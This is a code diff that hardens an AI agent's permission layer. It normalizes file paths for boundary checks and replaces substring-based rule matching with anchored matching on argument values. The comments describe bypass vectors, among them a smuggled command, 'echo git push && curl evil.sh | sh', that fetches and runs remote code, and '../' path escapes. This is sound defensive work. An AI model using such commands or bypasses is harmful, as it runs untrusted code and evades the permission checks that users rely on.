@@ -195,24 +195,88 @@ function checkAskRules(
   return null;
 }
 
-/** C9: Normalize a path for case-insensitive boundary comparison (Windows-safe). */
+/**
+ * C9: Normalize a path for case-insensitive boundary comparison (Windows-safe).
+ *
+ * PA-1 / audit AC-R2 P0-1: lexically resolves `.` / `..` dot-segments and
+ * unifies separators (`\` → `/`). Roots (`/`, `c:/`, `//`) are preserved;
+ * relative inputs may keep leading `..` (they are resolved later against cwd,
+ * see isPathInBoundary). Pure function — intentionally NO fs access:
+ * symlink → realpath re-verification is deferred to a follow-up hardening
+ * task and must not be simulated lexically here.
+ */
 function normalizePath(p: string): string {
-  return p.replace(/\\/g, '/').toLowerCase();
+  const unified = p.replace(/\\/g, '/').toLowerCase();
+
+  let root = '';
+  let rest = unified;
+  if (unified.startsWith('//')) {
+    root = '//';
+    rest = unified.slice(2);
+  } else if (/^[a-z]:\//.test(unified)) {
+    root = unified.slice(0, 3); // e.g. "c:/"
+    rest = unified.slice(3);
+  } else if (/^[a-z]:$/.test(unified)) {
+    return `${unified}/`; // bare drive letter → rooted
+  } else if (unified.startsWith('/')) {
+    root = '/';
+    rest = unified.slice(1);
+  }
+
+  const stack: string[] = [];
+  const over: string[] = []; // Gate-probe rework: relative overshoot ".." lives in its own
+                             // channel — NEVER reachable by a later ".." pop (the former
+                             // shared-stack design let even counts of leading "../"
+                             // annihilate each other and resurrect audit vector b).
+  for (const seg of rest.split('/')) {
+    if (seg === '' || seg === '.') continue; // collapse empty + current-dir segments
+    if (seg === '..') {
+      if (stack.length > 0) stack.pop();     // climb one level down
+      else if (root === '') over.push('..'); // relative path: accumulate leading overshoot
+      // else: rooted input — ".." clamps at the filesystem/drive root (unchanged)
+      continue;
+    }
+    stack.push(seg);
+  }
+  const overflow = over.map(() => '..').join('/'); // leading "../" prefix, count-preserving
+  const body = stack.join('/');
+  return root + overflow + (overflow && body ? '/' : '') + body;
 }
 
-/** C9: Check if a tool's file target is within the allowed boundary (cwd + additionalDirs). */
+/** True when an already-normalized path carries a root (posix "/", drive "c:/", or "//unc"). */
+function isRootedPath(normalized: string): boolean {
+  return normalized.startsWith('/') || /^[a-z]:/.test(normalized);
+}
+
+/**
+ * C9 / PA-1 (audit AC-R2 P0-1): Check if a tool's file target is within the
+ * allowed boundary (cwd + additionalDirectories).
+ *
+ * Fix: lexical normalization first, then an anchored boundary test — the
+ * target must equal the boundary directory itself or live underneath it
+ * (`boundary + '/'` prefix). The previous bare `startsWith` permitted both
+ * bypass vectors:
+ *   (a) sibling-prefix confusion — "/srv/x/TriCo-evil" vs boundary "/srv/x/TriCo";
+ *   (b) relative dot-segment escape — "../../etc/..." joined onto cwd.
+ */
 function isPathInBoundary(
   filePath: string,
   cwd: string,
   additionalDirectories?: string[],
 ): boolean {
   const normalizedTarget = normalizePath(filePath);
-  const absoluteTarget = normalizedTarget.startsWith('/') || /^[a-z]:/i.test(normalizedTarget)
+  const absoluteTarget = isRootedPath(normalizedTarget)
     ? normalizedTarget
-    : `${normalizePath(cwd)}/${normalizedTarget}`;
+    : normalizePath(`${normalizePath(cwd)}/${normalizedTarget}`);
 
-  const boundaries = [normalizePath(cwd), ...(additionalDirectories ?? []).map(normalizePath)];
-  return boundaries.some((b) => absoluteTarget.startsWith(b));
+  const boundaries = [
+    normalizePath(cwd),
+    ...(additionalDirectories ?? []).map(normalizePath),
+  ];
+  return boundaries.some((b) => {
+    const prefix = b.endsWith('/') ? b : `${b}/`;
+    return absoluteTarget === b || absoluteTarget.startsWith(prefix);
+  });
 }
 
 /** Check mode: acceptEdits — restrict writes to cwd + additionalDirs. */
@@ -414,19 +478,48 @@ function matchesTool(rule: PermissionRule, toolName: string): boolean {
   return false;
 }
 
-/** Check if rule's content filter matches tool arguments. */
+/**
+ * PA-1 (audit AC-R2 P0-3): structured content matching against extracted
+ * scalar argument values — NOT the serialized whole-args blob.
+ *
+ * Contract (rule-parser.ts:32-45 / types.ts:102-121):
+ *   - exact     "Bash(git push)"  → anchored full-equality (case-insensitive)
+ *   - wildcard  "Bash(curl *)"    → prefix match anchored at candidate head
+ *                                   (parser keeps the trailing space: "curl ")
+ *   - wildcard  "Bash(python:*)"  → prefix match, parser keeps "python:"
+ *
+ * Matching basis: TOP-LEVEL string field values of args only. Keys and
+ * nested object/array serialization are deliberately excluded — the previous
+ * `JSON.stringify(args).toLowerCase().includes()` turned every content-scoped
+ * rule into "substring anywhere in the serialized blob", letting
+ * `echo git push && curl evil.sh | sh` satisfy an exact "Bash(git push)"
+ * allow rule (full permission-bypass primitive). The dead isWildcard branch
+ * is gone; both semantics are now genuinely implemented.
+ */
 function matchesContent(rule: PermissionRule, args: Record<string, unknown>): boolean {
   if (!rule.content) return true;
 
-  // Serialize all args for content matching
-  const argsStr = JSON.stringify(args).toLowerCase();
   const content = rule.content.toLowerCase();
-
-  if (rule.isWildcard) {
-    return argsStr.includes(content);
+  for (const candidate of extractScalarArgValues(args)) {
+    const value = candidate.toLowerCase();
+    if (rule.isWildcard ? value.startsWith(content) : value === content) {
+      return true;
+    }
   }
+  return false;
+}
 
-  return argsStr.includes(content);
+/**
+ * Collect scalar candidates for content matching: top-level string field
+ * values of the args object. Nested structures and array payloads are
+ * excluded by design (see matchesContent P0-3 rationale).
+ */
+function extractScalarArgValues(args: Record<string, unknown>): string[] {
+  const values: string[] = [];
+  for (const v of Object.values(args)) {
+    if (typeof v === 'string' && v.length > 0) values.push(v);
+  }
+  return values;
 }
 
 /** Extract file path from tool args (write_file, edit_file formats). */
